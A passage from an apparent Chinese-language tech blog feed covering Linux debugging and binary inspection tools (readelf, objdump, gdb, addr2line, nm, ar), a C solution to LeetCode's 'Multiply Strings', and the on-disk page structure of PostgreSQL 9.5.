class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -al cmdTest</span><br><span class="line">-rwxr-xr-x <span class="number">1</span> hyb root <span class="number">9792</span> Sep <span class="number">25</span> <span class="number">20</span>:<span class="number">30</span> cmdTest <span class="comment">#总大小为9792字节</span></span><br><span class="line">strip cmdTest</span><br><span class="line">ls -al cmdTest</span><br><span class="line">-rwxr-xr-x <span class="number">1</span> hyb root <span class="number">6248</span> Sep <span class="number">25</span> <span class="number">20</span>:<span class="number">35</span> cmdTest<span class="comment">#strip之后大小为6248字节</span></span><br></pre></td></tr></table></figure><p>可以看到，“瘦身”之后，<strong>大小减少将近三分之一</strong>。但是要特别注意的是，“瘦身”之后的elf文件由于没有了符号信息，许多调试命令将无法正常使用，出现core dump时，问题也较难定位，因此只建议在正式发布时对其进行“瘦身”。</p><h2 id="查看elf文件信息–readelf"><a href="#查看elf文件信息–readelf" class="headerlink" title="查看elf文件信息–readelf"></a>查看elf文件信息–readelf</h2><p>readelf用于查看elf文件信息，它可以查看各段信息，符号信息等，下面的例子是查看elf文件头信息：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">readelf -h cmdTest</span><br><span class="line">  Magic:   <span class="number">7</span>f <span class="number">45</span> <span class="number">4</span>c <span class="number">46</span> <span class="number">02</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="comment">#elf文件魔数字</span></span><br><span class="line">  Class:                             ELF64  <span class="comment">#64位 elf文件</span></span><br><span class="line">  <span class="keyword">Data</span>:                              <span class="number">2</span><span class="string">'s complement, little endian#字节序为小端序</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V #</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              EXEC (Executable file)#目标文件类型</span></span><br><span class="line"><span class="string">  Machine:                           Advanced Micro Devices X86-64 #目标处理器体系</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x400440  #入口地址</span></span><br><span class="line"><span class="string">  Start of program headers:          64 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          4456 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x0</span></span><br><span class="line"><span class="string">  Size of this header:               64 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           56 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         9</span></span><br><span class="line"><span class="string">  Size of section headers:           64 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         28</span></span><br><span class="line"><span class="string">  Section header string table index: 27</span></span><br></pre></td></tr></table></figure><p>从elf头信息中，我们可以知道该elf是64位可执行文件，运行在x86-64中，且字节序为小端序。另外，我们还注意到它的入口地址是0x400440(_start)，而不是400540(main)。也就是说，<strong>我们的程序运行并非从main开始</strong>。</p><h2 id="反汇编指定函数–objdump"><a href="#反汇编指定函数–objdump" class="headerlink" title="反汇编指定函数–objdump"></a>反汇编指定函数–objdump</h2><p>objdump用于展示elf文件信息，功能较多，在此不逐一介绍。有时候我们需要反汇编来定位一些问题，可以使用命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d cmdTest <span class="comment">#反汇编整个cmdTest程序</span></span><br></pre></td></tr></table></figure><p>但是如果程序较大，那么反汇编时间将会变长，而且反汇编文件也会很大。如果我们已经知道了问题在某个函数，只想反汇编某一个函数，怎么处理呢？<br>我们可以利用前面介绍的nm命令获取到函数test的地址，然后使用下面的方式反汇编：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d cmdTest --start-address=<span class="number">0</span>x40052d --stop-address=<span class="number">0</span>x400540 <span class="comment">##反汇编指定地址区间</span></span><br></pre></td></tr></table></figure><h2 id="端口占用情况查看–netstat"><a href="#端口占用情况查看–netstat" class="headerlink" title="端口占用情况查看–netstat"></a>端口占用情况查看–netstat</h2><p>我们可能常常会遇到进程第一次启动后，再次启动会出现端口绑定失败的问题，我们可以通过netstat命令查看端口占用情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anp|grep 端口号</span><br></pre></td></tr></table></figure><h2 id="进程状态查看–ps-amp-top"><a href="#进程状态查看–ps-amp-top" class="headerlink" title="进程状态查看–ps&amp;top"></a>进程状态查看–ps&amp;top</h2><p>ps命令的用法可以参考<a href="http://mp.weixin.qq.com/s?__biz=MzI2OTA3NTk3Ng==&amp;mid=2649283839&amp;idx=1&amp;sn=62bb18d464ba24c660f69dc1800e880b&amp;chksm=f2f9af98c58e268e12cae70085511bb58ea0955d74e7f6bac28e3bb3adc13ca0e8fc2e5cc66e&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">ps命令常见实用用法</a>。<br>top命令实时显示当前进程状态，最活跃的进程显示在最顶部。</p><h2 id="core-dump文件生成配置–ulimit-c"><a href="#core-dump文件生成配置–ulimit-c" class="headerlink" title="core dump文件生成配置–ulimit -c"></a>core dump文件生成配置–ulimit -c</h2><p>有时候我们的程序core dump了却没有生成core文件，很可能是我们设置的问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c #查看core文件配置，如果结果为0，程序core dump时将不会生成core文件</span><br><span class="line">ulimit -c unlimited #不限制core文件生成大小</span><br><span class="line">ulimit -c 10 #设置最大生成大小为10kb</span><br></pre></td></tr></table></figure><h2 id="调试神器–gdb"><a href="#调试神器–gdb" class="headerlink" title="调试神器–gdb"></a>调试神器–gdb</h2><p>gdb是一个强大的调试工具，但这里仅介绍两个简单使用示例。<br>有时候程序可能已经正在运行，但是又不能终止它，这时候仍然可以使用<strong>gdb调试正在运行的进程</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb processFile PID #processFile为进程文件，pid为进程id，可通过ps命令查找到</span><br></pre></td></tr></table></figure><p>有时候程序可能core dump了，但是系统还留给了我们一个礼物–core文件。<br>在core文件生成配置完成之后，运行cmdTest程序，产生core文件。我们可以用下面的方法通过core文件<strong>定位出错位置</strong>：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb cmdTest core <span class="comment">#processFile为进程文件，core为生成的core文件</span></span><br><span class="line">Core was generated by `./cmdTest<span class="string">'.</span></span><br><span class="line"><span class="string">Program terminated with signal SIGFPE, Arithmetic exception.</span></span><br><span class="line"><span class="string">#0  0x00000000004004fb in test (a=10, b=0) at cmdTest.c:4</span></span><br><span class="line"><span class="string">4         return a/b;</span></span><br><span class="line"><span class="string">(gdb)bt</span></span><br><span class="line"><span class="string">#0  0x00000000004004fb in test (a=10, b=0) at cmdTest.c:4</span></span><br><span class="line"><span class="string">#1  0x000000000040052c in main (argc=1, argv=0x7ffca9536d38) at cmdTest.c:10</span></span><br><span class="line"><span class="string">(gdb)</span></span><br></pre></td></tr></table></figure><p>输入bt后，就可以看到调用栈了,出错位置在test函数，cmdTest.c的第4行。</p><h2 id="定位crash问题–addr2line"><a href="#定位crash问题–addr2line" class="headerlink" title="定位crash问题–addr2line"></a>定位crash问题–addr2line</h2><p>有时候程序崩溃了但不幸没有生成core文件，是不是就完全没有办法了呢？还是cmdTest的例子。运行完cmdTest之后，我们通过dmesg命令可以获取到以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[27153070.538380] traps: cmdTest[2836] trap divide error ip:40053b sp:7ffc230d9280 error:0 in cmdTest[400000+1000]</span><br></pre></td></tr></table></figure><p>该信息记录了cmdTest运行出错的基本原因（divide error）和出错位置（40053b）,我们使用addr2line命令获取出错具体行号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addr2line -e cmdTest 40053b</span><br><span class="line">/home/hyb/practice/cmdTest.c:4</span><br></pre></td></tr></table></figure><p>可以看到addr2line命令将地址(40053b)翻译成了文件名(cmdTest.c)和行号(4)，确定了出错位置。</p><hr><p><strong>转载自其它文章.</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
            <tag> 调试 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Multiply Strings</title>
      <link href="/2018/10/31/alogr/Multiply-Strings/"/>
      <url>/2018/10/31/alogr/Multiply-Strings/</url>
      
        <content type="html"><![CDATA[<p>Given two numbers represented as strings, return multiplication of the numbers as a string.</p><p>Note: The numbers can be arbitrarily large and are non-negative.</p><p>Note:</p><ul><li>The length of both num1 and num2 is &lt; 110.</li><li>Both num1 and num2 contain only digits 0-9.</li><li>Both num1 and num2 do not contain any leading zero, except the number 0 itself.</li><li>You must not use any built-in BigInteger library or convert the inputs to integer directly.</li></ul><p><br><br><a id="more"></a></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路:"></a>思路:</h4><p><img src="/img/leetcode/Multiply Strings.jpg" alt=""></p><p>（Ps: 手写稍微忍耐一些吧 ^_^）</p><p>我们发现:  p[i+j]  = a[i] * b[j] + 进位; </p><p><br></p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">multiply</span><span class="params">(<span class="keyword">char</span>* num1, <span class="keyword">char</span>* num2)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sz1 = <span class="built_in">strlen</span>(num1);</span><br><span class="line">    <span class="keyword">int</span> sz2 = <span class="built_in">strlen</span>(num2);</span><br><span class="line">    <span class="keyword">int</span> i, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> high, low;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (sz1 + sz2 + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">memset</span>(p + sz1 + sz2, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(p, <span class="string">'0'</span>, sz1 + sz2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sz1; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j =<span class="number">0</span>; j &lt; sz2; j++)</span><br><span class="line">        &#123;</span><br><span class="line">           high = ( num1[i] - <span class="string">'0'</span> )  * ( num2[j] - <span class="string">'0'</span> ) / <span class="number">10</span> + ( p[i+j] - <span class="string">'0'</span>);</span><br><span class="line">           low = ( num1[i] - <span class="string">'0'</span> )  * ( num2[j] - <span class="string">'0'</span> )  % <span class="number">10</span> + ( p[i+j+<span class="number">1</span>] - <span class="string">'0'</span>);</span><br><span class="line">        </span><br><span class="line">           <span class="keyword">if</span>(high &gt; <span class="number">9</span>)</span><br><span class="line">           &#123;</span><br><span class="line">                p[i+j] = high - <span class="number">10</span> + <span class="string">'0'</span>;</span><br><span class="line">                <span class="keyword">for</span>(k = i+j<span class="number">-1</span>; ; k--)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>( p[k] != <span class="string">'9'</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        p[k] += <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        p[k] = <span class="string">'0'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">                p[i+j] = high + <span class="string">'0'</span>;</span><br><span class="line">        </span><br><span class="line">           <span class="keyword">if</span>(low &gt; <span class="number">9</span>)</span><br><span class="line">           &#123;</span><br><span class="line">                p[i+j+<span class="number">1</span>]  = low - <span class="number">10</span> + <span class="string">'0'</span>;</span><br><span class="line">                <span class="keyword">for</span>(k = i+j; ; k--)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>( p[k] != <span class="string">'9'</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        p[k] += <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        p[k] = <span class="string">'0'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">                p[i+j+<span class="number">1</span>] = low + <span class="string">'0'</span>; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i =<span class="number">0</span> ; i &lt; (sz1 + sz2 - <span class="number">1</span>); i++, p++)</span><br><span class="line">       <span class="keyword">if</span>( *p != <span class="string">'0'</span>)</span><br><span class="line">           <span class="keyword">return</span> p; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><p><a href="https://leetcode.com/problems/multiply-strings/description/" target="_blank" rel="noopener">LeetÇode-问题描述</a></p><p><strong>运行1W次时间:</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> * str1 = <span class="string">"9999999999999999999999999999999999999999999999999999"</span>;</span><br><span class="line"><span class="keyword">char</span> * str2 = <span class="string">"9999999999999999999999999999999999999999999999999999"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>( i = <span class="number">0</span> ; i &lt;<span class="number">10000</span> ; i++)</span><br><span class="line">    multiply(str1, str2);</span><br></pre></td></tr></table></figure></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">real0m0.455s</span><br><span class="line">user0m0.451s</span><br><span class="line">sys0m0.003s</span><br></pre></td></tr></table></figure><p><strong>LeetCode 测试结果:</strong><br><img src="/img/leetcode/LeetCode-43.png" alt="Leetcode结果"></p>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>二进制文件分析</title>
      <link href="/2018/10/28/rebuild/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/"/>
      <url>/2018/10/28/rebuild/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<ul><li>nm</li><li>objdump</li><li>readelf</li><li>ar</li></ul><p>二进制文件符号清单.文件信息等;</p><p><br><br><a id="more"></a></p><h3 id="nm"><a href="#nm" class="headerlink" title="nm"></a><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/advance/02_program_debug.html#id11" target="_blank" rel="noopener">nm</a></h3><p>nm用来列出目标文件的符号清单。</p><ul><li>-a或–debug-syms：显示所有的符号，包括debugger-only symbols。</li><li>-B：等同于–format=bsd，用来兼容MIPS的nm。</li><li>-C或–demangle：将低级符号名解析(demangle)成用户级名字。这样可以使得C++函数名具有可读性。</li><li>–no-demangle：默认的选项，不需要将低级符号名解析成用户级名。</li><li>-D或–dynamic：显示动态符号。该任选项仅对于动态目标(例如特定类型的共享库)有意义。</li><li>-f format：使用format格式输出。format可以选取bsd、sysv或posix，该选项在GNU的nm中有用。默认为bsd。</li><li>-g或–extern-only：仅显示外部符号。</li><li>-n、-v或–numeric-sort：按符号对应地址的顺序排序，而非按符号名的字符顺序。</li><li>-p或–no-sort：按目标文件中遇到的符号顺序显示，不排序。</li><li>-P或–portability：使用POSIX.2标准输出格式代替默认的输出格式。等同于使用任选项-f posix。</li><li>-s或–print-armap：当列出库中成员的符号时，包含索引。索引的内容包含：哪些模块包含哪些名字的映射。</li><li>-r或–reverse-sort：反转排序的顺序(例如，升序变为降序)。</li><li>–size-sort：按大小排列符号顺序。该大小是按照一个符号的值与它下一个符号的值进行计算的。</li><li>–target=bfdname：指定一个目标代码的格式，而非使用系统的默认格式。</li><li>-u或–undefined-only：仅显示没有定义的符号(那些外部符号)。</li><li>–defined-only:仅显示定义的符号。</li><li>-l或–line-numbers：对每个符号，使用调试信息来试图找到文件名和行号。</li><li>-V或–version：显示nm的版本号。</li><li>–help：显示nm的选项。</li></ul><p><br></p><h3 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/advance/02_program_debug.html#id12" target="_blank" rel="noopener">objdump</a></h3><p>ogjdump工具用来显示二进制文件的信息，就是以一种可阅读的格式让你更多地了解二进制文件可能带有的附加信息。</p><ul><li>-f 显示文件头信息</li><li>-D 反汇编所有section (-d反汇编特定section)</li><li>-h 显示目标文件各个section的头部摘要信息</li><li>-x 显示所有可用的头信息，包括符号表、重定位入口。-x 等价于 -a -f -h -r -t 同时指定。</li><li>-i 显示对于 -b 或者 -m 选项可用的架构和目标格式列表。</li><li>-r 显示文件的重定位入口。如果和-d或者-D一起使用，重定位部分以反汇编后的格式显示出来。</li><li>-R 显示文件的动态重定位入口，仅仅对于动态目标文件有意义，比如某些共享库。</li><li>-S 尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数。</li><li>-t 显示文件的符号表入口。类似于nm -s提供的信息</li></ul><p><br></p><h3 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/advance/02_program_debug.html#id13" target="_blank" rel="noopener">readelf</a></h3><p>这个工具和objdump命令提供的功能类似，但是它显示的信息更为具体，并且它不依赖BFD库(BFD库是一个GNU项目，它的目标就是希望通过一种统一的接口来处理不同的目标文件）</p><ul><li><p><strong>ELF文件类型</strong></p><p>ELF(Executable and Linking Format)是一种对象文件的格式，用于定义不同类型的对象文件(Object files)中都放了什么东西、以及都以什么样的格式去放这些东西。它自最早在 System V 系统上出现后，被 xNIX 世界所广泛接受，作为缺省的二进制文件格式来使用。可以说，ELF是构成众多xNIX系统的基础之一。</p></li></ul><p>ELF文件有三种类型：</p><ol><li><ul><li>可重定位的对象文件(Relocatable file)<br>由汇编器汇编生成的 .o 文件</li></ul></li><li><ul><li>可执行的对象文件(Executable file)<br>可执行应用程序</li></ul></li><li><ul><li>可被共享的对象文件(Shared object file)<br>动态库文件，也即 .so 文件</li></ul></li></ol><ul><li>.text section 里装载了可执行代码；</li><li>.data section 里面装载了被初始化的数据；</li><li>.bss section 里面装载了未被初始化的数据；</li><li>以 .rec 打头的 sections 里面装载了重定位条目；</li><li>.symtab 或者 .dynsym section 里面装载了符号信息；</li><li>.strtab 或者 .dynstr section 里面装载了字符串信息；</li></ul><p><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/readelf.html" target="_blank" rel="noopener">linux-readelf</a></p><p><br></p><h3 id="ar"><a href="#ar" class="headerlink" title="ar"></a>ar</h3><p>Linux ar命令用于建立或修改备存文件，或是从备存文件中抽取文件。<br>ar可让您集合许多文件，成为单一的备存文件。在备存文件中，所有成员文件皆保有原来的属性与权限。</p><p><strong>必要参数</strong>：</p><ul><li>-d 　删除备存文件中的成员文件。</li><li>-m 　变更成员文件在备存文件中的次序。</li><li>-p 　显示备存文件中的成员文件内容。</li><li>-q 　将文件附加在备存文件末端。</li><li>-r 　将文件插入备存文件中。</li><li>-t 　显示备存文件中所包含的文件。</li><li>-x 　自备存文件中取出成员文件。</li></ul><p><strong>选项参数</strong>：</p><ul><li>a&lt;成员文件&gt; 　将文件插入备存文件中指定的成员文件之后。</li><li>b&lt;成员文件&gt; 　将文件插入备存文件中指定的成员文件之前。</li><li>c 　建立备存文件。</li><li>f 　为避免过长的文件名不兼容于其他系统的ar指令指令，因此可利用此参数，截掉要放入备存文件中过长的成员文件名称。</li><li>i&lt;成员文件&gt; 　将问家插入备存文件中指定的成员文件之前。</li><li>o 　保留备存文件中文件的日期。</li><li>s 　若备存文件中包含了对象模式，可利用此参数建立备存文件的符号表。</li><li>S 　不产生符号表。</li><li>u 　只将日期较新文件插入备存文件中。</li><li>v 　程序执行时显示详细的信息。</li><li>V 　显示版本信息。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Postgresql开发 Page</title>
      <link href="/2018/10/09/database/PostgreSql-page/"/>
      <url>/2018/10/09/database/PostgreSql-page/</url>
      
        <content type="html"><![CDATA[<ul><li>本文章基于Postgresql 9.5</li><li>Page数据页结构</li><li>tablepce、table、toast、index数据文件位置</li><li>hexpdump解析数据文件</li></ul><p><br><br><a id="more"></a></p><h5 id="Page结构"><a href="#Page结构" class="headerlink" title="Page结构"></a>Page结构</h5><p>PG数据表存储在N个数据文件中，每个数据文件有N个Page(大小默认为8K，可在编译安装时指定)组成，Page为Pg最小存取单元。</p><p><img src="/img/postgresql/pg_smgr_manager.png" alt="普通数据表存储结构"></p><p><img src="/img/postgresql/table_page.png" alt=""></p><p><img src="/img/postgresql/postgresql-page.png" alt="数据页"></p><p>数据页8Kb = 8 * 1024 Byte， 其中分为五部分:</p><ul><li>PageHeaderData:  24字节长，包含关于页面的一般信息，包括空闲空间指针。24Byte;</li><li>ItemIdData:    一个记录(偏移量，长度)对的数组，指向实际项。 4Byte;</li><li>Free Space:    为分配的空间(空闲空间)<ul><li>新itemIdData指针从头部开始分配</li><li>新数据Items从结尾开始分配</li></ul></li><li>Items   实际的项本身 – 实际结构取决于表包含的内容，表和序列都是用<code>HeapTupleHeaderData</code>结构, 索引需要不同对待。</li><li>Special Space   索引访问模式相关的数据。不同的索引访问方式存放不同的数据。在普通表中为空。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* include/stotage/bufpage.h</span></span><br><span class="line"><span class="comment"> * disk page organization</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * space management information generic to any page</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *pd_lsn- identifies xlog record for last change to this page.</span></span><br><span class="line"><span class="comment"> *pd_checksum - page checksum, if set.</span></span><br><span class="line"><span class="comment"> *pd_flags- flag bits.</span></span><br><span class="line"><span class="comment"> *pd_lower- offset to start of free space.</span></span><br><span class="line"><span class="comment"> *pd_upper- offset to end of free space.</span></span><br><span class="line"><span class="comment"> *pd_special- offset to start of special space.</span></span><br><span class="line"><span class="comment"> *pd_pagesize_version - size in bytes and page layout version number.</span></span><br><span class="line"><span class="comment"> *pd_prune_xid - oldest XID among potentially prunable tuples on page.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">uint32xlogid;<span class="comment">/* high bits */</span>   <span class="comment">//4Byte</span></span><br><span class="line">uint32xrecoff;<span class="comment">/* low bits */</span>    <span class="comment">//4Byte</span></span><br><span class="line">&#125; PageXLogRecPtr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PageHeaderData</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">/* XXX LSN is member of *any* block, not only page-organized ones */</span></span><br><span class="line">PageXLogRecPtr pd_lsn;<span class="comment">/* LSN: next byte after last byte of xlog </span></span><br><span class="line"><span class="comment"> * record for last change to this page */</span> <span class="comment">// 8Byte</span></span><br><span class="line">uint16pd_checksum;<span class="comment">/* checksum */</span>                              <span class="comment">//2Byte</span></span><br><span class="line">uint16pd_flags;<span class="comment">/* flag bits, see below */</span>                 <span class="comment">//2Byte</span></span><br><span class="line">LocationIndex pd_lower;<span class="comment">/* offset to start of free space */</span>         <span class="comment">//2Byte</span></span><br><span class="line">LocationIndex pd_upper;<span class="comment">/* offset to end of free space */</span>           <span class="comment">//2Byte</span></span><br><span class="line">LocationIndex pd_special;<span class="comment">/* offset to start of special space */</span>      <span class="comment">//2Byte</span></span><br><span class="line">uint16pd_pagesize_version;                                        <span class="comment">//2Byte</span></span><br><span class="line">TransactionId pd_prune_xid; <span class="comment">/* oldest prunable XID, or zero if none */</span>  <span class="comment">//4Byte</span></span><br><span class="line">ItemIdDatapd_linp[FLEXIBLE_ARRAY_MEMBER]; <span class="comment">/* line pointer array */</span></span><br><span class="line">&#125; PageHeaderData;</span><br></pre></td></tr></table></figure><ul><li>pg_lsn：记录最后一次对page修改的xlog记录id。</li><li>pg_checksum：页面的校验和，主要是通过函数pg_checksum_block函数生成的，0也是有效地，参数为PageHeaderData和BLCKSZ(page’s size)。当校验和验证失败，即认为当前页面无效。        </li><li><p>pg_flags：page的flags，具体值为，可以叠加:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PD_HAS_FREE_LINES   0x0001      <span class="comment">/* are there any unused line pointers? */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PD_PAGE_FULL        0x0002      <span class="comment">/* not enough free space for new</span></span></span><br><span class="line"><span class="meta"><span class="comment">                                          * tuple? */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PD_ALL_VISIBLE      0x0004      <span class="comment">/* all tuples on page are visible to</span></span></span><br><span class="line"><span class="meta"><span class="comment">                                          * everyone */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PD_VALID_FLAG_BITS  0x0007      <span class="comment">/* OR of all valid pd_flags bits 